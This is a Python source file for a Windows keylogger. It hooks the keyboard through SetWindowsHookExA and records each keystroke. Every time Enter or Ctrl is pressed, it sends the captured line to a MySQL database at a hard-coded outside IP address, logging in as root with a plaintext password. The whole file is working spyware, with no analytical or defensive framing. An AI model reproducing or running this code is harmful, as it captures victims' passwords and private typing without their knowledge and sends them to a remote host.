import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
import pymysql
import time

# 连接数据库
connect = pymysql.Connect(
    host='118.126.90.21',
    port=3306,
    user='root',
    passwd='demo1029',
    db='mysql',
    charset='utf8'
)
# 获取游标
cursor = connect.cursor()
user32 = windll.user32
kernel32 = windll.kernel32

current_date = time.strftime("%Y%m%d%H%M%S", time.localtime())
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162
ENTER_CODE = 13
RecordLine = []

class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self,pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True
    def unisallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int,c_int,c_int,POINTER(c_void_p))
    print(CMPFUNC(fn))
    return CMPFUNC(fn)

def hookProc(nCode,wParam,lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(keyLogger.hooked,nCode,wParam,lParam)
    hookedKey = chr(0xffffffff&lParam[0])
    RecordLine.append(hookedKey)
    if int(0xffffffff & lParam[0]) == ENTER_CODE:
        UploadLine = ''.join(RecordLine)
        RecordLine.clear()
        cursor.execute("insert into mysql.key_board_record values('" + UploadLine + "'," + current_date +  ")")
        connect.commit()
    if int(0xffffffff&lParam[0]) == CTRL_CODE:
        UploadLine = ''.join(RecordLine)
        RecordLine.clear()
        cursor.execute("insert into mysql.key_board_record values('" + UploadLine + "'," + current_date + ")")
        connect.commit()
        keyLogger.unisallHookProc()
        cursor.close()
        connect.close()
        sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked,nCode,wParam,lParam)

def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg),0,0,0)

keyLogger = KeyLogger()
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
    print('installed keylogger')

startKeyLog()
